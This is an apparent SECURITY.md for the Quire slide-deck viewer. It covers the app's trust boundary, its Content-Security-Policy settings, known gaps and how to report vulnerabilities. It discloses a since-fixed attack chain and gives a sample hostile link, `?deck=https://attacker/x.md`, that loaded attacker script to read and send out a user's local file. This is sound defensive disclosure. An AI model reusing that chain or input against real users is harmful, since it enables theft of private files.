# Security

## The trust boundary, stated plainly

**A deck is executable content. Open decks the way you would open a script:
only from someone you trust.**

The Quire source format allows raw HTML on purpose, because its built-in
constructs are too blunt for every typographic need (`SPEC.md` §3.7). The viewer puts
that HTML in the DOM. One consequence follows directly and is easy to miss:

> Opening someone else's `.quire` or `.md` deck runs its JavaScript in the page.

That is not a defect to be fixed without changing the format, so it is
documented rather than hidden. The app's policy blocks the quiet network
channels available to embedded content, but cannot prevent top-level
navigation.

## What the app does about it

**A Content-Security-Policy on the app shell.** `connect-src 'self'` blocks
cross-origin `fetch`, XHR, and similar connections; `img-src 'self' data:`
blocks remote image beacons; `form-action 'none'` blocks form submission; and
`base-uri 'none'` prevents base-URL rewriting. `script-src` cannot be tightened
while raw HTML is a feature, so the policy limits network channels rather than
preventing deck script from running.

**`?deck=` is same-origin only.** The parameter takes a relative path beside
the app and nothing else — no absolute URL, no `//host`, no leading `/`.
Without that check, a *link* was enough: `?deck=https://attacker/x.md` fetched
attacker content (they set the CORS header on their own host), rendered it, and
ran their script in the app's origin. From there it could read the file handle
the app persists in IndexedDB — whose permission is granted silently on return
by design — read the local file it pointed at, and post it away, while the
screen showed a plausible deck. That chain was demonstrated end to end against
a real local file before the check existed.

**No deck content is transmitted.** The app has no telemetry, no analytics, no
server, and no code path that sends deck text anywhere. This is a design
constraint, not a setting.

## What it does not do

**Exported decks carry no CSP.** An export is a standalone file built for
recipients without the app, and it inherits whatever HTML the deck contained.
Opening an exported `.html` is exactly as trusted as opening any HTML
attachment. If you export a deck you did not write, you are forwarding its
markup along with its slides.

**Handle permission is not scoped inside a deck.** The app stores one handle for
the last `.quire` or `.md` file opened. Anything running in the page can reach
that complete file.

**Top-level navigation is not blocked by CSP.** Deck script can assign
`location.href` or open a new page with data in the URL. That is visible to the
user, unlike a background request, but it means the policy is not a guarantee
that hostile deck content cannot carry local data off the machine.

**A host should send headers the meta policy cannot.** `frame-ancestors` is
ignored in a `<meta>` element; a deployment that can set response headers
should send `frame-ancestors 'none'` there.

## Reporting a vulnerability

Open a GitHub issue for anything already public or low risk. For something
exploitable that is not yet public, use GitHub's **Report a vulnerability**
button under the repository's Security tab, which is private, rather than a
public issue.

Useful reports say what an attacker controls, what they get, and what a user
had to do. A proof of concept is welcome; a working one against a local file is
what turned the `?deck=` issue above from theoretical into a fix.
